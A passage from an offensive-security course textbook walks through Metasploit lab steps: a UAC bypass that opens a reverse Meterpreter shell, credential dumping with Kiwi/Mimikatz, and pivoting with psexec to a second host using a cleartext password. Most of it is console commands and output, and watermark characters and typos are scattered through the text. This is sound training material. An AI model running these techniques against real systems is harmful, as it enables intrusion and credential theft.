msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_sdclt) > show options
Module options (exploit/windows/local/bypassuac_sdclt):
Name Current Setting Required Description
---- --------------- -------- -----------
PAYLOAD_NAME no The filename to use for the payload binary
(%RAND% by default).
SESSION yes The session to run this module on
Payload options (windows/x64/meterpreter/reverse_tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
998 (Threatpost, 2017), https://threatpost.com/fileless-uac-bypass-uses-windows-backup-and-restore-utility/124579/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 674
Made in Morocco
Penetration Testing with Kali Linux
EXITFUNC process yes Exit technique (Accepted: '', seh, thread,
process, none)
LHOST yes The listen address (an interface may be
specified)
LPORT 4444 yes The listen port
...
msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 9
SESSION => 32
msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST 192.168.119.4
LHOST => 192.168.119.4
msf6 exploit(windows/local/bypassuac_sdclt) > run
[*] Started reverse TCP handler on 192.168.119.4:4444
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing... y
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[!] This exploit requires manual cleanup of k
'C:\Users\offsec\AppData\Local\Temp\KzjRPQbrhdj.exe!
[*] Please wait for session and cleanup....
s
[*] Sending stage (200774 bytes) to 192.168.50.223
[*] Meterpreter session 10 opened (192.168.119.4:4444 -> 192.168.50.223:49740) at
2022-08-04 09:03:54 -0400 o
[*] Registry Changes Removed
meterpreter > n
Listing 686 - Executing a UAC bypass using a Meterpreter session
Listing 686 shows that our UAC biypass post-exploitation module created a new Meterpreter
session for us. z
Let’s check the integrity level of the process as we did before.
D
meterpreter > shell
Process 2328 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.795]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32> powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows
PS C:\Windows\system32> Import-Module NtObjectManager
Import-Module NtObjectManager
PS C:\Windows\system32> Get-NtTokenIntegrityLevel
Get-NtTokenIntegrityLevel
High
Listing 687 - Reviewing integrity level
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 675
Made in Morocco
Penetration Testing with Kali Linux
Nice! Listing 687 shows that the process our payload runs in has the integrity level High and
therefore we have successfully bypassed UAC.
Besides being able to background an active session and execute modules through it, we can also
load extensions directly inside the active session with the load command.
One great example of this is Kiwi, which is a Meterpreter extension providing the capabilities of
Mimikatz. Because Mimikatz requires SYSTEM rights, let’s exit the current Meterpreter session,
start the listener again, execute met.exe as user luiza in the bind shell, and enter getsystem.
msf6 exploit(windows/local/bypassuac_sdclt) > use exploit/multi/handler
[*] Using configured payload windows/x64/meterpreter_reverse_https
msf6 exploit(multi/handler) > run
[*] Started HTTPS reverse handler on https://192.168.119.4:44y3
[*] https://192.168.119.4:443 handling request from 192.168.50.223; (UUID: gokdtcex)
Redirecting stageless connection from /tiUQIXcIFB-
k
TCZIL8eJASw2GMM8KqsU3KADjTJhh8lSgwsEBpqGfM1Q0FsWwlgyPzfFi9gci43oVxGCxcYQy0mH0 with UA
'Mozilla/5.0 (Macintosh; Intel Mac OS X 12.2; rv:97.0) Gecko/20100101 Firefox/97.0'
[*] https://192.168.119.4:443 handling request frosm 192.168.50.223; (UUID: gokdtcex)
Attaching orphaned/stageless session...
[*] Meterpreter session 11 opened (192.168.119.4:443 -> 127.0.0.1) at 2022-08-04
o
10:10:16 -0400
meterpreter > getsystem
n
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
Listing 688 - Using getsystem in a newly spawned Meterpreter session via execution of met.exe in the bind shell
i
Now, let’s enter load with kiwi as argument to load the Kiwi module. Then, we can use help to
z
display the commands of the Kiwi module. Finally, we’ll use creds_msv to retrieve LM999 and
NTLM1000 credentials.
D
meterpreter > load kiwi
Loading extension kiwi...
.#####. mimikatz 2.2.0 20191125 (x64/windows)
.## ^ ##. "A La Vie, A L'Amour" - (oe.eo)
## / \ ## /*** Benjamin DELPY `gentilkiwi` ( PI:EMAIL )
## \ / ## > http://blog.gentilkiwi.com/mimikatz
'## v ##' Vincent LE TOUX ( PI:EMAIL )
'#####' > http://pingcastle.com / http://mysmartlogon.com ***/
Success.
meterpreter > help
...
Kiwi Commands
=============
999 (Wikipedia, 2022), https://en.wikipedia.org/wiki/LAN_Manager
1000 (Wikipedia, 2022), https://en.wikipedia.org/wiki/NT_LAN_Manager
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 676
Made in Morocco
Penetration Testing with Kali Linux
Command Description
------- -----------
creds_all Retrieve all credentials (parsed)
creds_kerberos Retrieve Kerberos creds (parsed)
creds_livessp Retrieve Live SSP creds
creds_msv Retrieve LM/NTLM creds (parsed)
creds_ssp Retrieve SSP creds
creds_tspkg Retrieve TsPkg creds (parsed)
creds_wdigest Retrieve WDigest creds (parsed)
dcsync Retrieve user account information via DCSync (unparsed)
dcsync_ntlm Retrieve user account NTLM hash, SID and RID via DCSync
golden_ticket_create Create a golden kerberos ticket
kerberos_ticket_list List all kerberos tickets (unparsed)
kerberos_ticket_purge Purge any in-use kerberos tickets
kerberos_ticket_use Use a kerberos ticket
kiwi_cmd Execute an arbitary mimikatz commaynd (unparsed)
lsa_dump_sam Dump LSA SAM (unparsed)
lsa_dump_secrets Dump LSA secrets (unparsed)
password_change Change the password/hash of ak user
wifi_list List wifi profiles/creds for the current user
wifi_list_shared List shared wifi profiles/creds (requires SYSTEM)
s
meterpreter > creds_msv
[+] Running as SYSTEM o
[*] Retrieving msv credentials
msv credentials
=============== n
Username Domain NTLM SHA1
-------- ------ ---- i ----
luiza ITWK01 167cf9218719za1209efcfb4bce486a18
2f92bb5c2a2526a630122ea1b642c46193a0d837
...
D
Listing 689 - Load the Kiwi module and execute creds_msv to retrieve credentials of the system
Listing 689 shows that we could successfully retrieve the NTLM hash of luiza.
Let’s briefly summarize what we did in this section. First, we discussed what post-exploitation
modules in Metasploit are and how we can use them. Then, we used a post-exploitation module
on a session to bypass UAC and obtain a shell with high integrity level. Next, we loaded a
Meterpreter extension named Kiwi, which provides the capabilities of Mimikatz to retrieve
credentials from a system with sufficient privileges.
20.3.3 Pivoting with Metasploit
The ability to pivot to another target or network is a vital skill for every penetration tester. In Port
Redirection and Pivoting, we learned various techniques to perform pivoting. Instead of using
these techniques manually, we can also use Metasploit to perform them.
As in the previous sections, we’ll connect to the bind shell on port 4444 on the machine ITWK01.
Let’s assume we are currently gathering information on the target. In this step, we’ll identify a
second network interface.
C:\Users\luiza> ipconfig
ipconfig
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 677
Made in Morocco
Penetration Testing with Kali Linux
Windows IP Configuration
Ethernet adapter Ethernet0:
Connection-specific DNS Suffix . :
Link-local IPv6 Address . . . . . : fe80::c489:5302:7182:1e97%11
IPv4 Address. . . . . . . . . . . : 192.168.50.223
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 192.168.50.254
Ethernet adapter Ethernet1:
Connection-specific DNS Suffix . :
Link-local IPv6 Address . . . . . : fe80::b540:a783:94ff:8y9dc%14
IPv4 Address. . . . . . . . . . . : 172.16.5.199
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : k
C:\Users\luiza>
s
Listing 690 - Dual interfaces on compromised client
Listing 690 shows that the second interface haso the assigned IP 172.16.5.199. We can try to
identify other live hosts on this second network by leveraging methods from active information
gathering. Before we do so, let’s start a Meterpreter shell on our compromised target by
downloading and executing met.exe as welnl as starting the corresponding multi/handler as we did
before.
i
[*] Started HTTPS reverse handler on https://192.168.119.4:443
z
...
[*] Meterpreter session 12 opened (192.168.119.4:443 -> 127.0.0.1) at 2022-08-05
05:13:42 -0400 D
meterpreter >
Listing 691 - Newly opened session via execution of met.exe
Now that we have a working session on the compromised system, we can background it. To add
a route to a network reachable through a compromised host, we can use route add with the
network information and session ID that the route applies to. After adding the route, we can
display the current routes with route print.
meterpreter > bg
[*] Backgrounding session 12...
msf6 exploit(multi/handler) > route add 172.16.5.0/24 12
[*] Route added
msf6 exploit(multi/handler) > route print
IPv4 Active Routing Table
=========================
Subnet Netmask Gateway
------ ------- -------
172.16.5.0 255.255.255.0 Session 12
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 678
Made in Morocco
Penetration Testing with Kali Linux
[*] There are currently no IPv6 routes defined.
Listing 692 - Adding route to network 172.16.5.0/24 from session 2
With a path created to the internal network, we can enumerate this subnet. Now we could scan
the whole network for live hosts with a port scan auxiliary module. Since this scan would take
quite some time to complete, let’s shorten this step by only scanning the other live host in the
second network. Therefore, instead of setting the value of RHOSTS to 172.16.5.0/24 as we would
do if we wanted to scan the whole network, we set it to 172.16.5.200. For now, we only want to
scan ports 445 and 3389.
msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.5.200
RHOSTS => 172.16.5.200
y
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
PORTS => 445,3389 k
msf6 auxiliary(scanner/portscan/tcp) > run
s
[+] 172.16.5.200: - 172.16.5.200:445 - TCP OPEN
[+] 172.16.5.200: - 172.16.5.200:3389 - TCP OPEN
o
[*] 172.16.5.200: - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
Listing 693 - Portscanning an internal IP address
n
Listing 693 shows that 172.161.5.200 has ports 445 and 3389 open. Let’s use two modules for
SMB and RDP using our pivot host ITWK01 to perform operations on the target.
i
z
First, we’ll attempt to use the psexec1001 module to get access on the second target as user luiza.
In the previous section, we retrieved the NTLM hash via Kiwi. Let’s assume we could successfully
crack the NTLM hash andD the clear-text password is BoccieDearAeroMeow1!. For psexec to
succeed, luiza has to be a local administrator on the second machine. For this example, let’s also
assume that we confirmed this through information gathering techniques.
Let’s use exploit/windows/smb/psexec and set SMBUser to luiza, SMBPass to
BoccieDearAeroMeow1!, and RHOSTS to 172.16.5.200.
It’s important to note that the added route will only work with established connections. Because
of this, the new shell on the target must be a bind shell such as
windows/x64/meterpreter/bind_tcp, thus allowing us to use the set route to connect to it. A
reverse shell payload would not be able to find its way back to our attacking system in most
situations because the target does not have a route defined for our network.
msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set SMBUser luiza
SMBUser => luiza
1001 (Github, 2021), https://github.com/rapid7/metasploit-
framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 679
Made in Morocco
Penetration Testing with Kali Linux
msf6 exploit(windows/smb/psexec) > set SMBPass "BoccieDearAeroMeow1!"
SMBPass => BoccieDearAeroMeow1!
msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.5.200
RHOSTS => 172.16.5.200
msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(windows/smb/psexec) > set LPORT 8000
LPORT => 8000
Listing 694 - Setting options for the psexec exploit module
Now that all options are set, we can launch the module.
msf6 exploit(windows/smb/psexec) > run
y
[*] 172.16.5.200:445 - Connecting to the server...
[*] 172.16.5.200:445 - Authenticating to 172.16.5.200:44k5|ITWK02 as user 'luiza'...
[*] 172.16.5.200:445 - Selecting PowerShell target
[*] 172.16.5.200:445 - Executing the payload...
s
[+] 172.16.5.200:445 - Service start timed out, OK if running a command or non-service
executable...
[*] Started bind TCP handler against 172.16.5o.200:8000
[*] Sending stage (200774 bytes) to 172.16.5.200
[*] Meterpreter session 13 opened (172.16.5.199:51785 -> 172.16.5.200:8000 via session
12) at 2022-08-05 07:06:43 -0400 n
meterpreter >
Listing 69i5 - Launching the psexec exploit module
z
Listing 695 shows that we successfully used the psexec exploit module to obtain a Meterpreter
shell on the second target via the compromised machine.
D
As an alternative to adding routes manually, we can use the autoroute post-exploitation module to
set up pivot routes through an existing Meterpreter session automatically. To demonstrate the
usage of this module, we first need to remove the route we set manually. Let’s terminate the
Meterpreter session created through the psexec module and remove all routes with route flush.
Now the only session left is the Meterpreter session created by executing met.exe as user luiza. In
addition, the result of route print states that there are no routes defined. Next, let’s activate the
module multi/manage/autoroute in which we have to set the session ID as value for the option
SESSION. Then, let’s enter run to launch the module.
msf6 exploit(windows/smb/psexec) > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > show options